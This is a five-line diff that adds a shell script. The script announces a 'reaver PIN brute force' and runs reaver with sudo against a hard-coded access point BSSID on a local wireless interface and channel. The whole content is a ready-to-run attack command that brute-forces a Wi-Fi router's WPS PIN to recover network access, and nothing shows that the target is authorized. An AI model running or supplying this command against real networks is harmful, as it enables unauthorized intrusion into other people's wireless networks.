@@ -1,0 +1,5 @@
+echo "Now begins the reaver PIN brute force"
+
+
+sudo reaver -b B0:C7:45:B0:AB:D0 -i wlp3s0 -c 2 -vv
+
